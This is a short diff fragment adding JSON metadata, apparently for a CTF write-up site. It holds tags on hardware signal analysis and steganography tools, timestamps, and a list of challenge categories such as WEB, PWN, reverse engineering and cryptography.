+        "SSD1306",
+        "OLED",
+        "硬件安全",
+        "信号分析",
+        "PulseView",
+        "zsteg",
+        "隐写"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    }
+  ],
+  "types": [
+    "WEB",
+    "PWN",
+    "SRC",
+    "逆向",
+    "密码学",
+    "MISC"
+  ]
+}
